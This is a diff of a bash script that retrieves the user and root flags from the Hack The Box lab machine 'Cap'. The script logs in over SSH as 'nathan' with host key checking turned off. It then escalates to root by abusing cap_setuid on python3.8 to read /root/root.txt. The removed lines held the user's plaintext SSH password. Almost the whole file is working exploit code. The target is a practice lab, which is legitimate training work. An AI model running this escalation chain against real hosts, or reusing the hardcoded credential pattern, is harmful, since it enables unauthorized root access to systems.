@@ -1,41 +1,29 @@
 #!/usr/bin/env bash
 #
-# cap-flags.sh — retrieve user and root flags from HTB Cap
+# flags.sh — retrieve user and root flags from HTB Cap
 #
-# Chains the known foothold (SSH creds recovered from the pcap) with the
-# cap_setuid privesc on /usr/bin/python3.8. Both flags are pulled over SSH;
-# no interactive shell is needed.
+# No external dependencies: uses only the ssh client you already have.
+# It opens a single SSH session and runs both commands remotely, so you
+# type the password just once when prompted.
 #
-# Usage:   ./cap-flags.sh [target-ip]
-# Example: ./cap-flags.sh 10.129.134.144
-# Requires: sshpass   (Arch/Omarchy:  sudo pacman -S sshpass)
+# Usage:   ./flags.sh [target-ip]
+# Example: ./flags.sh 10.129.134.144
 
 set -euo pipefail
 
-TARGET="${1:-10.129.134.144}"
+TARGET="${1:-10.129.134.252}"
 REMOTE_USER="nathan"
-REMOTE_PASS='Buck3tH4TF0RM3!'
-
-# Non-interactive SSH: don't prompt on host key, don't pollute known_hosts,
-# fail fast instead of hanging.
-SSH_OPTS=(
-  -o StrictHostKeyChecking=no
-  -o UserKnownHostsFile=/dev/null
-  -o ConnectTimeout=10
-)
-
-run() { sshpass -p "$REMOTE_PASS" ssh "${SSH_OPTS[@]}" "$REMOTE_USER@$TARGET" "$1" 2>/dev/null; }
 
 echo "[*] Target: $TARGET"
+echo "[*] Enter the SSH password when prompted (you only type it once)."
 
-# --- User flag: read it directly as nathan ---
-echo "[*] Reading user flag..."
-USER_FLAG="$(run 'cat ~/user.txt')"
-echo "[+] user.txt: ${USER_FLAG:-<not found>}"
-
-# --- Root flag: abuse cap_setuid on python3.8 to read /root/root.txt ---
-# python3.8 carries cap_setuid+ep, so os.setuid(0) succeeds; we then read the
-# file in the same process — no shell escalation required.
-echo "[*] Escalating via cap_setuid on python3.8..."
-ROOT_FLAG="$(run '/usr/bin/python3.8 -c "import os; os.setuid(0); print(open(\"/root/root.txt\").read().strip())"')"
-echo "[+] root.txt: ${ROOT_FLAG:-<not found>}"
+# The quoted heredoc (<<'REMOTE') is sent to the remote shell verbatim —
+# nothing is expanded locally, so the quotes inside need no escaping.
+ssh -o StrictHostKeyChecking=no \
+    -o UserKnownHostsFile=/dev/null \
+    -o ConnectTimeout=10 \
+    "$REMOTE_USER@$TARGET" 'bash -s' <<'REMOTE'
+echo "[+] user.txt: $(cat ~/user.txt)"
+# cap_setuid on python3.8 lets us become root and read the file in one process.
+/usr/bin/python3.8 -c 'import os; os.setuid(0); print("[+] root.txt:", open("/root/root.txt").read().strip())'
+REMOTE
